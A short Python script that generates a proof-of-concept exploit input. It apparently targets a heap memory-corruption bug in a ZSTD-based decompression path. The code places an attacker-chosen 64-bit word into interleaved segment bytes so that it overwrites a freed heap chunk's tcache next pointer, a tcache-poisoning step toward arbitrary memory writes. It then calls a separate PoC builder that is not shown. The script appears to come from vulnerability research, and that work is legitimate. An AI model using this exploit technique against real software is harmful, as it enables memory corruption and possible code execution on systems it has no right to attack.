#!/usr/bin/env python3
"""W-new: forge a mixed-full PoC whose COPY2 bytes encode a chosen 64-bit word
at destination offsets +16..+23 (the freed 0x30 chunk's tcache next pointer).

The pinned ZSTD segment transform interleaves segment 1 for the second copy:

    source[2*i]     = seg1[i]        (i = 0..63)
    source[2*i + 1] = seg1[64 + i]

so source offsets 16..23 come from seg1[8:12] and seg1[72:76].  COPY2 starts
at dst+256, so those eight bytes land at dst+272, exactly the user start of
the chunk whose header is at dst+256.  All other segment-1 bytes stay BYTE.

Usage: make_tcache_poc.py BASE OUT WORD [N] [BYTE] [U]
"""
import subprocess
import sys

BASE, OUT, WORD = sys.argv[1], sys.argv[2], int(sys.argv[3], 0)
N = int(sys.argv[4]) if len(sys.argv) > 4 else 64
BYTE = int(sys.argv[5], 0) if len(sys.argv) > 5 else 0x5A
U = int(sys.argv[6], 0) if len(sys.argv) > 6 else 4 * N
if not 0 <= WORD < 1 << 64:
    raise SystemExit("WORD must fit in 64 bits")

seg1 = bytearray([BYTE]) * (2 * N)
word = WORD.to_bytes(8, "little")
for j in range(4):
    seg1[8 + j] = word[2 * j]
    seg1[72 + j] = word[2 * j + 1]

subprocess.run(
    [sys.executable, "cases/make_poc_mixed_full.py", BASE, OUT,
     str(N), hex(BYTE), str(U), seg1.hex()],
    check=True,
)
print(f"tcache: word=0x{WORD:016x} seg1[8:12]={seg1[8:12].hex()} "
      f"seg1[72:76]={seg1[72:76].hex()}")
